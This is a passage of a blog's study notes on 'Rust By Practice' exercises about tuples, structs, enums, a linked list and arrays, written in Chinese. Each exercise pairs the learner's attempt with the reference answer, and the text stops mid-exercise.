1234567891011121314151617181920212223// 填空use std::mem;fn main() &#123; let story = String::from(&quot;Rust By Practice&quot;); // 阻止 String 的数据被自动 drop let mut story = mem::ManuallyDrop::new(story); let ptr = story.__(); let len = story.__(); let capacity = story.__(); assert_eq!(16, len); // 我们可以基于 ptr 指针、长度和容量来重新构建 String. // 这种操作必须标记为 unsafe，因为我们需要自己来确保这里的操作是安全的 let s = unsafe &#123; String::from_raw_parts(ptr, len, capacity) &#125;; assert_eq!(*story, s); println!(&quot;Success!&quot;)&#125; My Answer 不会 Answer 123456789101112131415161718192021222324use std::mem;fn main() &#123; let story = String::from(&quot;Rust By Practice&quot;); // Prevent automatically dropping the String&#x27;s data let mut story = mem::ManuallyDrop::new(story); let ptr = story.as_mut_ptr(); let len = story.len(); let capacity = story.capacity(); // story has nineteen bytes assert_eq!(16, len); // We can re-build a String out of ptr, len, and capacity. This is all // unsafe because we are responsible for making sure the components are // valid: let s = unsafe &#123; String::from_raw_parts(ptr, len, capacity) &#125;; assert_eq!(*story, s); println!(&quot;Success!&quot;)&#125; 元组 🌟 元组中的元素可以是不同的类型。元组的类型签名是 (T1, T2, ...), 这里 T1, T2 是相对应的元组成员的类型. 1234567fn main() &#123; let _t0: (u8,i16) = (0, -1); // 元组的成员还可以是一个元组 let _t1: (u8, (i16, u32)) = (0, (-1, 1)); // 填空让代码工作 let t: (u8, __, i64, __, __) = (1u8, 2u16, 3i64, &quot;hello&quot;, String::from(&quot;, world&quot;));&#125; My Answer 1234567fn main() &#123; let _t0: (u8,i16) = (0, -1); // 元组的成员还可以是一个元组 let _t1: (u8, (i16, u32)) = (0, (-1, 1)); // 填空让代码工作 let t: (u8, u16, i64, &amp;str, String) = (1u8, 2u16, 3i64, &quot;hello&quot;, String::from(&quot;, world&quot;));&#125; Answer 123456fn main() &#123; let _t0: (u8,i16) = (0, -1); // Tuples can be tuple&#x27;s members let _t1: (u8, (i16, u32)) = (0, (-1, 1)); let t: (u8, u16, i64, &amp;str, String) = (1u8, 2u16, 3i64, &quot;hello&quot;, String::from(&quot;, world&quot;));&#125; 🌟 可以使用索引来获取元组的成员 12345// 修改合适的地方，让代码工作fn main() &#123; let t = (&quot;i&quot;, &quot;am&quot;, &quot;sunface&quot;); assert_eq!(t.1, &quot;sunface&quot;);&#125; My Answer 12345// 修改合适的地方，让代码工作fn main() &#123; let t = (&quot;i&quot;, &quot;am&quot;, &quot;sunface&quot;); assert_eq!(t.2, &quot;sunface&quot;);&#125; Answer 1234fn main() &#123; let t = (&quot;i&quot;, &quot;am&quot;, &quot;sunface&quot;); assert_eq!(t.2, &quot;sunface&quot;); &#125; 🌟 过长的元组无法被打印输出 12345// 修复代码错误fn main() &#123; let too_long_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13); println!(&quot;too long tuple: &#123;:?&#125;&quot;, too_long_tuple);&#125; My Answer 12345// 修复代码错误fn main() &#123; let too_long_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12); println!(&quot;too long tuple: &#123;:?&#125;&quot;, too_long_tuple);&#125; Answer 1234fn main() &#123; let too_long_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12); println!(&quot;too long tuple: &#123;:?&#125;&quot;, too_long_tuple);&#125; 🌟 使用模式匹配来解构元组 12345678910fn main() &#123; let tup = (1, 6.4, &quot;hello&quot;); // 填空 let __ = tup; assert_eq!(x, 1); assert_eq!(y, &quot;hello&quot;); assert_eq!(z, 6.4);&#125; My Answer 12345678910fn main() &#123; let tup = (1, 6.4, &quot;hello&quot;); // 填空 let (x,z,y) = tup; assert_eq!(x, 1); assert_eq!(y, &quot;hello&quot;); assert_eq!(z, 6.4);&#125; Answer 123456789fn main() &#123; let tup = (1, 6.4, &quot;hello&quot;); let (x, z, y) = tup; assert_eq!(x, 1); assert_eq!(y, &quot;hello&quot;); assert_eq!(z, 6.4);&#125; 🌟🌟 解构式赋值 12345678910fn main() &#123; let (x, y, z); // 填空 __ = (1, 2, 3); assert_eq!(x, 3); assert_eq!(y, 1); assert_eq!(z, 2);&#125; My Answer 12345678910fn main() &#123; let (x, y, z); // 填空 (y,z,x) = (1, 2, 3); assert_eq!(x, 3); assert_eq!(y, 1); assert_eq!(z, 2);&#125; Answer 12345678910fn main() &#123; let (x, y, z); // fill the blank (y, z, x) = (1, 2, 3); assert_eq!(x, 3); assert_eq!(y, 1); assert_eq!(z, 2);&#125; 🌟🌟 元组可以用于函数的参数和返回值 1234567891011fn main() &#123; // 填空，需要稍微计算下 let (x, y) = sum_multiply(__); assert_eq!(x, 5); assert_eq!(y, 6);&#125;fn sum_multiply(nums: (i32, i32)) -&gt; (i32, i32) &#123; (nums.0 + nums.1, nums.0 * nums.1)&#125; My Answer 1234567891011fn main() &#123; // 填空，需要稍微计算下 let (x, y) = sum_multiply((2,3)); assert_eq!(x, 5); assert_eq!(y, 6);&#125;fn sum_multiply(nums: (i32, i32)) -&gt; (i32, i32) &#123; (nums.0 + nums.1, nums.0 * nums.1)&#125; Answer 12345678910fn main() &#123; let (x, y) = sum_multiply((2, 3)); assert_eq!(x, 5); assert_eq!(y, 6); &#125; fn sum_multiply(nums: (i32, i32)) -&gt; (i32, i32) &#123; (nums.0 + nums.1, nums.0 * nums.1) &#125; 结构体三种类型的结构体 🌟 对于结构体，我们必须为其中的每一个字段都指定具体的值 12345678910111213// fix the errorstruct Person &#123; name: String, age: u8, hobby: String&#125;fn main() &#123; let age = 30; let p = Person &#123; name: String::from(&quot;sunface&quot;), age, &#125;;&#125; My Answer 1234567891011121314// fix the errorstruct Person &#123; name: String, age: u8, hobby: String&#125;fn main() &#123; let age = 30; let p = Person &#123; name: String::from(&quot;sunface&quot;), age, hobby: String::from(&quot;baseball&quot;) &#125;;&#125; Answer 12345678910111213struct Person &#123; name: String, age: u8, hobby: String&#125;fn main() &#123; let age = 30; let p = Person &#123; name: String::from(&quot;sunface&quot;), age, hobby: &quot;coding&quot;.to_string() &#125;;&#125; 🌟 单元结构体没有任何字段。 123456789101112131415struct Unit;trait SomeTrait &#123; // ...定义一些行为&#125;// 我们并不关心结构体中有什么数据( 字段 )，但我们关心它的行为。// 因此这里我们使用没有任何字段的单元结构体，然后为它实现一些行为impl SomeTrait for Unit &#123; &#125;fn main() &#123; let u = Unit; do_something_with_unit(u);&#125; // 填空，让代码工作fn do_something_with_unit(u: __) &#123; &#125; My Answer 123456789101112131415struct Unit;trait SomeTrait &#123; // ...定义一些行为&#125;// 我们并不关心结构体中有什么数据( 字段 )，但我们关心它的行为。// 因此这里我们使用没有任何字段的单元结构体，然后为它实现一些行为impl SomeTrait for Unit &#123; &#125;fn main() &#123; let u = Unit; do_something_with_unit(u);&#125; // 填空，让代码工作fn do_something_with_unit(u: Unit) &#123; &#125; Answer 123456789101112131415struct Unit;trait SomeTrait &#123; // ...Some behavours defines here&#125;// We don&#x27;t care the the fields are in Unit, but we care its behaviors.// So we use a struct with no fields and implement some behaviors for itimpl SomeTrait for Unit &#123; &#125;fn main() &#123; let u = Unit; do_something_with_unit(u);&#125; // fill the blank to make the code workfn do_something_with_unit(u: Unit) &#123; &#125; 🌟🌟🌟 元组结构体看起来跟元组很像，但是它拥有一个结构体的名称，该名称可以赋予它一定的意义。由于它并不关心内部数据到底是什么名称，因此此时元组结构体就非常适合。 1234567891011121314// 填空并修复错误struct Color(i32, i32, i32);struct Point(i32, i32, i32);fn main() &#123; let v = Point(__, __, __); check_color(v);&#125; fn check_color(p: Color) &#123; let (x, _, _) = p; assert_eq!(x, 0); assert_eq!(p.1, 127); assert_eq!(__, 255); &#125; My Answer 1234567891011121314// 填空并修复错误struct Color(i32, i32, i32);struct Point(i32, i32, i32);fn main() &#123; let v = Color(0, 127, 255); check_color(v);&#125; fn check_color(p: Color) &#123; let Color(x,_,_) = p; assert_eq!(x, 0); assert_eq!(p.1, 127); assert_eq!(p.2, 255); &#125; Answer 12345678910111213struct Color(i32, i32, i32);struct Point(i32, i32, i32);fn main() &#123; let v = Point(0, 127, 255); check_color(v);&#125; fn check_color(p: Point) &#123; let Point(x, _, _) = p; assert_eq!(x, 0); assert_eq!(p.1, 127); assert_eq!(p.2, 255);&#125; 结构体上的一些操作 🌟 你可以在实例化一个结构体时将它整体标记为可变的，但是 Rust 不允许我们将结构体的某个字段专门指定为可变的. 123456789101112131415161718// 填空并修复错误，不要增加或移除代码行struct Person &#123; name: String, age: u8,&#125;fn main() &#123; let age = 18; let p = Person &#123; name: String::from(&quot;sunface&quot;), age, &#125;; // how can you believe sunface is only 18? p.age = 30; // 填空 __ = String::from(&quot;sunfei&quot;);&#125; My Answer 123456789101112131415161718// 填空并修复错误，不要增加或移除代码行struct Person &#123; name: String, age: u8,&#125;fn main() &#123; let age = 18; let mut p = Person &#123; name: String::from(&quot;sunface&quot;), age, &#125;; // how can you believe sunface is only 18? p.age = 30; // 填空 p.name = String::from(&quot;sunfei&quot;);&#125; Answer 12345678910111213141516struct Person &#123; name: String, age: u8,&#125;fn main() &#123; let age = 18; let mut p = Person &#123; name: String::from(&quot;sunface&quot;), age, &#125;; // how can you believe sunface is only 18? p.age = 30; p.name = String::from(&quot;sunfei&quot;);&#125; 🌟 使用结构体字段初始化缩略语法可以减少一些重复代码 12345678910111213// 填空struct Person &#123; name: String, age: u8,&#125;fn main() &#123;&#125; fn build_person(name: String, age: u8) -&gt; Person &#123; Person &#123; age, __ &#125;&#125; My Answer 12345678910111213// 填空struct Person &#123; name: String, age: u8,&#125;fn main() &#123;&#125; fn build_person(name: String, age: u8) -&gt; Person &#123; Person &#123; age, name &#125;&#125; Answer 123456789101112struct Person &#123; name: String, age: u8,&#125;fn main() &#123;&#125; fn build_person(name: String, age: u8) -&gt; Person &#123; Person &#123; age, name &#125;&#125; 🌟 你可以使用结构体更新语法基于一个结构体实例来构造另一个 123456789101112131415161718192021222324// 填空，让代码工作struct User &#123; active: bool, username: String, email: String, sign_in_count: u64,&#125;fn main() &#123; let u1 = User &#123; email: String::from(&quot;someone@example.com&quot;), username: String::from(&quot;sunface&quot;), active: true, sign_in_count: 1, &#125;; let u2 = set_email(u1);&#125; fn set_email(u: User) -&gt; User &#123; User &#123; email: String::from(&quot;contact@im.dev&quot;), __ &#125;&#125; My Answer 123456789101112131415161718192021222324// 填空，让代码工作struct User &#123; active: bool, username: String, email: String, sign_in_count: u64,&#125;fn main() &#123; let u1 = User &#123; email: String::from(&quot;someone@example.com&quot;), username: String::from(&quot;sunface&quot;), active: true, sign_in_count: 1, &#125;; let u2 = set_email(u1);&#125; fn set_email(u: User) -&gt; User &#123; User &#123; email: String::from(&quot;contact@im.dev&quot;), ..u &#125;&#125; Answer 1234567891011121314151617181920212223struct User &#123; active: bool, username: String, email: String, sign_in_count: u64,&#125;fn main() &#123; let u1 = User &#123; email: String::from(&quot;someone@example.com&quot;), username: String::from(&quot;sunface&quot;), active: true, sign_in_count: 1, &#125;; let u2 = set_email(u1);&#125; fn set_email(u: User) -&gt; User &#123; User &#123; email: String::from(&quot;contact@im.dev&quot;), ..u &#125;&#125; 打印结构体 🌟🌟 我们可以使用 #[derive(Debug)] 让结构体变成可打印的. 123456789101112131415161718// 填空，让代码工作#[__]struct Rectangle &#123; width: u32, height: u32,&#125;fn main() &#123; let scale = 2; let rect1 = Rectangle &#123; width: dbg!(30 * scale), // 打印 debug 信息到标准错误输出 stderr,并将 `30 * scale` 的值赋给 `width` height: 50, &#125;; dbg!(&amp;rect1); // 打印 debug 信息到标准错误输出 stderr println!(__, rect1); // 打印 debug 信息到标准输出 stdout&#125; My Answer 123456789101112131415161718// 填空，让代码工作#[derive(Debug)]struct Rectangle &#123; width: u32, height: u32,&#125;fn main() &#123; let scale = 2; let rect1 = Rectangle &#123; width: dbg!(30 * scale), // 打印 debug 信息到标准错误输出 stderr,并将 `30 * scale` 的值赋给 `width` height: 50, &#125;; dbg!(&amp;rect1); // 打印 debug 信息到标准错误输出 stderr println!(&quot;&#123;:?&#125;&quot;, rect1); // 打印 debug 信息到标准输出 stdout&#125; Answer 1234567891011121314151617#[derive(Debug)]struct Rectangle &#123; width: u32, height: u32,&#125;fn main() &#123; let scale = 2; let rect1 = Rectangle &#123; width: dbg!(30 * scale), // print debug info to stderr and assign the value of `30 * scale` to `width` height: 50, &#125;; dbg!(&amp;rect1); // print debug info to stderr println!(&quot;&#123;:?&#125;&quot;, rect1); // print debug info to stdout&#125; 结构体的所有权当解构一个变量时，可以同时使用 move 和引用模式绑定的方式。当这么做时，部分 move 就会发生：变量中一部分的所有权被转移给其它变量，而另一部分我们获取了它的引用。 在这种情况下，原变量将无法再被使用，但是它没有转移所有权的那一部分依然可以使用，也就是之前被引用的那部分。 示例 1234567891011121314151617181920212223242526fn main() &#123; #[derive(Debug)] struct Person &#123; name: String, age: Box&lt;u8&gt;, &#125; let person = Person &#123; name: String::from(&quot;Alice&quot;), age: Box::new(20), &#125;; // 通过这种解构式模式匹配，person.name 的所有权被转移给新的变量 `name` // 但是，这里 `age` 变量却是对 person.age 的引用, 这里 ref 的使用相当于: let age = &amp;person.age let Person &#123; name, ref age &#125; = person; println!(&quot;The person&#x27;s age is &#123;&#125;&quot;, age); println!(&quot;The person&#x27;s name is &#123;&#125;&quot;, name); // Error! 原因是 person 的一部分已经被转移了所有权，因此我们无法再使用它 //println!(&quot;The person struct is &#123;:?&#125;&quot;, person); // 虽然 `person` 作为一个整体无法再被使用，但是 `person.age` 依然可以使用 println!(&quot;The person&#x27;s age from person struct is &#123;&#125;&quot;, person.age);&#125; 🌟🌟 1234567891011121314151617// 修复错误#[derive(Debug)]struct File &#123; name: String, data: String,&#125;fn main() &#123; let f = File &#123; name: String::from(&quot;readme.md&quot;), data: &quot;Rust By Practice&quot;.to_string() &#125;; let _name = f.name; // 只能修改这一行 println!(&quot;&#123;&#125;, &#123;&#125;, &#123;:?&#125;&quot;,f.name, f.data, f);&#125; My Answer 1234567891011121314151617// 修复错误#[derive(Debug)]struct File &#123; name: String, data: String,&#125;fn main() &#123; let f = File &#123; name: String::from(&quot;readme.md&quot;), data: &quot;Rust By Practice&quot;.to_string() &#125;; let _name = f.name; // 只能修改这一行 println!(&quot;&#123;&#125;&quot;,f.data);&#125; Answer 123456789101112131415#[derive(Debug)]struct File &#123; name: String, data: String,&#125;fn main() &#123; let f = File &#123; name: String::from(&quot;readme.md&quot;), data: &quot;Rust By Practice&quot;.to_string() &#125;; let _name = f.name; println!(&quot;&#123;&#125;&quot;, f.data);&#125; 枚举 🌟🌟 在创建枚举时，你可以使用显式的整数设定枚举成员的值 12345678910111213141516171819// 修复错误enum Number &#123; Zero, One, Two,&#125;enum Number1 &#123; Zero = 0, One, Two,&#125;// C语言风格的枚举定义enum Number2 &#123; Zero = 0.0, One = 1.0, Two = 2.0,&#125; fn main() { // 通过 `as` 可以将枚举值强转为整数类型 assert_eq!(Number::One, Number1::One); assert_eq!(Number1::One, Number2::One); } 12345678910111213141516171819202122232425262728293031323334- My Answer 没理解- Answer ```rust // 修复错误 enum Number &#123; Zero, One, Two, &#125; enum Number1 &#123; Zero = 0, One, Two, &#125; // C语言风格的枚举定义 enum Number2 &#123; Zero = 0, One = 1, Two = 2, &#125; fn main() &#123; // 通过 `as` 可以将枚举值强转为整数类型 assert_eq!(Number::One as u8, Number1::One as u8); assert_eq!(Number1::One as u8, Number2::One as u8); &#125; 🌟 枚举成员可以持有各种类型的值 123456789101112// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg1 = Message::Move&#123;__&#125;; // 使用x = 1, y = 2 来初始化 let msg2 = Message::Write(__); // 使用 &quot;hello, world!&quot; 来初始化&#125; My Answer 123456789101112// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg1 = Message::Move&#123;x: 1,y: 2&#125;; // 使用x = 1, y = 2 来初始化 let msg2 = Message::Write(&quot;hello,world!&quot;.to_string()); // 使用 &quot;hello, world!&quot; 来初始化&#125; Answer 1234567891011enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg1 = Message::Move&#123;x: 1, y: 2&#125;; // instantiating with x = 1, y = 2 let msg2 = Message::Write(String::from(&quot;hello, world&quot;)); // instantiating with &quot;hello, world!&quot;&#125; 🌟🌟 枚举成员中的值可以使用模式匹配来获取 1234567891011121314151617// 仅填空并修复错误enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg = Message::Move&#123;x: 1, y: 2&#125;; if let Message::Move&#123;__&#125; = msg &#123; assert_eq!(a, b); &#125; else &#123; panic!(&quot;不要让这行代码运行！&quot;); &#125;&#125; My Answer 1234567891011121314151617// 仅填空并修复错误enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg = Message::Move&#123;x: 1, y: 2&#125;; if let Message::Move&#123;x,y&#125; = msg &#123; assert_eq!(1, 1); &#125; else &#123; panic!(&quot;不要让这行代码运行！&quot;); &#125;&#125; Answer 12345678910111213141516enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msg = Message::Move&#123;x: 1, y: 1&#125;; if let Message::Move&#123;x: a, y: b&#125; = msg &#123; assert_eq!(a, b); &#125; else &#123; panic!(&quot;NEVER LET THIS RUN！&quot;); &#125;&#125; 🌟🌟 使用枚举对类型进行同一化 1234567891011121314151617181920212223// 填空，并修复错误enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs: __ = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; println!(&quot;&#123;&#125;&quot;, msg);&#125; My Answer 注意 Answer 1234567891011121314151617181920212223#[derive(Debug)]enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs: [Message; 3] = [ Message::Quit, Message::Move &#123; x: 1, y: 3 &#125;, Message::ChangeColor(255, 255, 0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125;fn show_message(msg: Message) &#123; println!(&quot;&#123;:?&#125;&quot;, msg);&#125; 🌟🌟 Rust 中没有 null，我们通过 Option&lt;T&gt; 枚举来处理值为空的情况 12345678910111213141516171819// 填空让 `println` 输出，同时添加一些代码不要让最后一行的 `panic` 执行到fn main() &#123; let five = Some(5); let six = plus_one(five); let none = plus_one(None); if let __ = six &#123; println!(&quot;&#123;&#125;&quot;, n) &#125; panic!(&quot;不要让这行代码运行！&quot;);&#125; fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123; match x &#123; __ =&gt; None, __ =&gt; Some(i + 1), &#125;&#125; My Answer 123456789101112131415161718192021// 填空让 `println` 输出，同时添加一些代码不要让最后一行的 `panic` 执行到fn main() &#123; let five = Some(5); let six = plus_one(five); let none = plus_one(None); if let five = six &#123; println!(&quot;&#123;&#125;&quot;, 1) &#125; else &#123; panic!(&quot;不要让这行代码运行！&quot;); &#125; &#125; fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123; match x &#123; None =&gt; None, Some(i) =&gt; Some(i + 1), &#125;&#125; Answer 12345678910111213141516171819fn main() &#123; let five = Some(5); let six = plus_one(five); let none = plus_one(None); if let Some(n) = six &#123; println!(&quot;&#123;&#125;&quot;, n); return &#125; panic!(&quot;NEVER LET THIS RUN！&quot;);&#125; fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123; match x &#123; None =&gt; None, Some(i) =&gt; Some(i + 1), &#125;&#125; 🌟🌟🌟🌟 使用枚举来实现链表. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 填空，让代码运行use crate::List::*;enum List &#123; // Cons: 链表中包含有值的节点，节点是元组类型，第一个元素是节点的值，第二个元素是指向下一个节点的指针 Cons(u32, Box&lt;List&gt;), // Nil: 链表中的最后一个节点，用于说明链表的结束 Nil,&#125;// 为枚举实现一些方法impl List &#123; // 创建空的链表 fn new() -&gt; List &#123; // 因为没有节点，所以直接返回 Nil 节点 // 枚举成员 Nil 的类型是 List Nil &#125; // 在老的链表前面新增一个节点，并返回新的链表 fn prepend(self, elem: u32) -&gt; __ &#123; Cons(elem, Box::new(self)) &#125; // 返回链表的长度 fn len(&amp;self) -&gt; u32 &#123; match *self &#123; // 这里我们不能拿走 tail 的所有权，因此需要获取它的引用 Cons(_, __ tail) =&gt; 1 + tail.len(), // 空链表的长度为 0 Nil =&gt; 0 &#125; &#125; // 返回链表的字符串表现形式，用于打印输出 fn stringify(&amp;self) -&gt; String &#123; match *self &#123; Cons(head, ref tail) =&gt; &#123; // 递归生成字符串 format!(&quot;&#123;&#125;, &#123;&#125;&quot;, head, tail.__()) &#125;, Nil =&gt; &#123; format!(&quot;Nil&quot;) &#125;, &#125; &#125;&#125;fn main() &#123; // 创建一个新的链表(也是空的) let mut list = List::new(); // 添加一些元素 list = list.prepend(1); list = list.prepend(2); list = list.prepend(3); // 打印列表的当前状态 println!(&quot;链表的长度是: &#123;&#125;&quot;, list.len()); println!(&quot;&#123;&#125;&quot;, list.stringify());&#125; My Answer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 填空，让代码运行use crate::List::*;enum List &#123; // Cons: 链表中包含有值的节点，节点是元组类型，第一个元素是节点的值，第二个元素是指向下一个节点的指针 Cons(u32, Box&lt;List&gt;), // Nil: 链表中的最后一个节点，用于说明链表的结束 Nil,&#125;// 为枚举实现一些方法impl List &#123; // 创建空的链表 fn new() -&gt; List &#123; // 因为没有节点，所以直接返回 Nil 节点 // 枚举成员 Nil 的类型是 List Nil &#125; // 在老的链表前面新增一个节点，并返回新的链表 fn prepend(self, elem: u32) -&gt; List &#123; Cons(elem, Box::new(self)) &#125; // 返回链表的长度 fn len(&amp;self) -&gt; u32 &#123; match *self &#123; // 这里我们不能拿走 tail 的所有权，因此需要获取它的引用 Cons(elem, ref tail) =&gt; 1 + tail.len(), // 空链表的长度为 0 Nil =&gt; 0 &#125; &#125; // 返回链表的字符串表现形式，用于打印输出 fn stringify(&amp;self) -&gt; String &#123; match *self &#123; Cons(head, ref tail) =&gt; &#123; // 递归生成字符串 format!(&quot;&#123;&#125;, &#123;&#125;&quot;, head, tail)//不会 &#125;, Nil =&gt; &#123; format!(&quot;Nil&quot;) &#125;, &#125; &#125;&#125;fn main() &#123; // 创建一个新的链表(也是空的) let mut list = List::new(); // 添加一些元素 list = list.prepend(1); list = list.prepend(2); list = list.prepend(3); // 打印列表的当前状态 println!(&quot;链表的长度是: &#123;&#125;&quot;, list.len()); println!(&quot;&#123;&#125;&quot;, list.stringify());&#125; Answer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869use crate::List::*;enum List &#123; // Cons: Tuple struct that wraps an element and a pointer to the next node Cons(u32, Box&lt;List&gt;), // Nil: A node that signifies the end of the linked list Nil,&#125;// Methods can be attached to an enumimpl List &#123; // Create an empty list fn new() -&gt; List &#123; // `Nil` has type `List` Nil &#125; // Consume a list, and return the same list with a new element at its front fn prepend(self, elem: u32) -&gt; List &#123; // `Cons` also has type List Cons(elem, Box::new(self)) &#125; // Return the length of the list fn len(&amp;self) -&gt; u32 &#123; // `self` has to be matched, because the behavior of this method // depends on the variant of `self` // `self` has type `&amp;List`, and `*self` has type `List`, matching on a // concrete type `T` is preferred over a match on a reference `&amp;T` // after Rust 2018 you can use self here and tail (with no ref) below as well, // rust will infer &amp;s and ref tail. // See https://doc.rust-lang.org/edition-guide/rust-2018/ownership-and-lifetimes/default-match-bindings.html match *self &#123; // Can&#x27;t take ownership of the tail, because `self` is borrowed; // instead take a reference to the tail Cons(_, ref tail) =&gt; 1 + tail.len(), // Base Case: An empty list has zero length Nil =&gt; 0 &#125; &#125; // Return representation of the list as a (heap allocated) string fn stringify(&amp;self) -&gt; String &#123; match *self &#123; Cons(head, ref tail) =&gt; &#123; // `format!` is similar to `print!`, but returns a heap // allocated string instead of printing to the console format!(&quot;&#123;&#125;, &#123;&#125;&quot;, head, tail.stringify()) &#125; Nil =&gt; &#123; format!(&quot;Nil&quot;) &#125; &#125; &#125;&#125;fn main() &#123; // Create an empty linked list let mut list = List::new(); // Prepend some elements list = list.prepend(1); list = list.prepend(2); list = list.prepend(3); // Show the final state of the list println!(&quot;linked list has length: &#123;&#125;&quot;, list.len()); println!(&quot;&#123;&#125;&quot;, list.stringify());&#125; 数组数组的类型是 [T; Length]，就如你所看到的，数组的长度是类型签名的一部分，因此数组的长度必须在编译期就已知，例如你不能使用以下方式来声明一个数组: 123fn create_arr(n: i32) &#123; let arr = [1; n];&#125; 以上函数将报错，因为编译器无法在编译期知道 n 的具体大小。 🌟 1234567fn main() &#123; // 使用合适的类型填空 let arr: __ = [1, 2, 3, 4, 5]; // 修改以下代码，让它顺利运行 assert!(arr.len() == 4);&#125; My Answer 1234567fn main() &#123; // 使用合适的类型填空 let arr: [u8;5] = [1, 2, 3, 4, 5]; // 修改以下代码，让它顺利运行 assert!(arr.len() == 5);&#125; Answer 12345fn main() &#123; let arr: [i32; 5] = [1, 2, 3, 4, 5]; assert!(arr.len() == 5);&#125; 🌟🌟 12345678910fn main() &#123; // 很多时候，我们可以忽略数组的部分类型，也可以忽略全部类型，让编译器帮助我们推导 let arr0 = [1, 2, 3]; let arr: [_; 3] = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; // 填空 // 数组分配在栈上， `std::mem::size_of_val` 函数会返回整个数组占用的内存空间 // 数组中的每个 char 元素占用 4 字节的内存空间，因为在 Rust 中， char 是 Unicode 字符 assert!(std::mem::size_of_val(&amp;arr) == __);&#125; My Answer 12345678910fn main() &#123; // 很多时候，我们可以忽略数组的部分类型，也可以忽略全部类型，让编译器帮助我们推导 let arr0 = [1, 2, 3]; let arr: [char; 3] = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; // 填空 // 数组分配在栈上， `std::mem::size_of_val` 函数会返回整个数组占用的内存空间 // 数组中的每个 char 元素占用 4 字节的内存空间，因为在 Rust 中， char 是 Unicode 字符 assert!(std::mem::size_of_val(&amp;arr) == 12);&#125; Answer 123456789fn main() &#123; // we can ignore parts of the array type or even the whole type, let the compiler infer it for us let arr0 = [1, 2, 3]; let arr: [_; 3] = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; // Arrays are stack allocated, `std::mem::size_of_val` return the bytes which array occupies // A char takes 4 byte in Rust: Unicode char assert!(std::mem::size_of_val(&amp;arr) == 12);&#125; 🌟 数组中的所有元素可以一起初始化为同一个值 1234567fn main() &#123; // 填空 let list: [i32; 100] = __ ; assert!(list[0] == 1); assert!(list.len() == 100);&#125; My Answer 1234567fn main() &#123; // 填空 let list: [i32; 100] = [1;100] ; assert!(list[0] == 1); assert!(list.len() == 100);&#125; Answer 123456fn main() &#123; let list: [i32; 100] = [1; 100]; assert!(list[0] == 1); assert!(list.len() == 100);&#125; 🌟 数组中的所有元素必须是同一类型 1234fn main() &#123; // 修复错误 let _arr = [1, 2, &#x27;3&#x27;];&#125; My Answer 1234fn main() &#123; // 修复错误 let _arr = [1, 2, 3];&#125; Answer 1234fn main() &#123; // fix the error let _arr = [1, 2, 3];&#125; 🌟 数组的下标索引从 0 开始. 1234567fn main() &#123; let arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; let ele = arr[1]; // 只修改此行来让代码工作 assert!(ele == &#x27;a&#x27;);&#125; My Answer 1234567fn main() &#123; let arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; let ele = arr[0]; // 只修改此行来让代码工作 assert!(ele == &#x27;a&#x27;);&#125; Answer 1234567fn main() &#123; let arr = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]; let ele = arr[0]; assert!(ele == &#x27;a&#x27;);&#125; 🌟 越界索引会导致代码的 panic. 12345678910// 修复代码中的错误fn main() &#123; let names = [String::from(&quot;Sunfei&quot;), &quot;Sunface&quot;.to_string()]; // `get` 返回 `Option&lt;T&gt;` 类型，因此它的使用非常安全 let name0 = names.get(0).unwrap(); // 但是下标索引就存在越界的风险了 let _name1 = &amp;names[2];&#125; My Answer 12345678910// 修复代码中的错误fn main() &#123; let names = [String::from(&quot;Sunfei&quot;), &quot;Sunface&quot;.to_string()]; // `get` 返回 `Option&lt;T&gt;` 类型，因此它的使用非常安全 let name0 = names.get(0).unwrap(); // 但是下标索引就存在越界的风险了 let _name1 = &amp;names[0];&#125; Answer 123456789fn main() &#123; let names = [String::from(&quot;Sunfei&quot;), &quot;Sunface&quot;.to_string()]; // `get` returns an Option&lt;T&gt;, it&#x27;s safe to use let name0 = names.get(0).unwrap(); // but indexing is not safe let _name1 = 